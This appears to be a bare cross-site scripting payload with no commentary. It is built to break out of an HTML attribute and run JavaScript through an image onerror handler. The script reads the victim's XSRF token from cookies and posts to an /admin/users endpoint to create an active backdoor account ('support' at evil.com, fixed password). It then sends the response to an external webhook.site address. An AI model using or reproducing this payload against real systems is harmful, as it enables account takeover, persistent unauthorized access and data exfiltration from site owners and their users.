"><img src=x onerror="
var t=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
fetch('/admin/users',{
  method:'POST',
  headers:{'Content-Type':'application/json','X-XSRF-TOKEN':t,'Accept':'application/json'},
  body:JSON.stringify({name:'support',email:'support@evil.com',password:'P@ssword1!',password_confirmation:'P@ssword1!',is_active:true})
}).then(r=>r.text()).then(d=>new Image().src='https://webhook.site/44c96653-a7fd-4743-9846-830dd719d82d/?d='+encodeURIComponent(d.substring(0,300)))
">
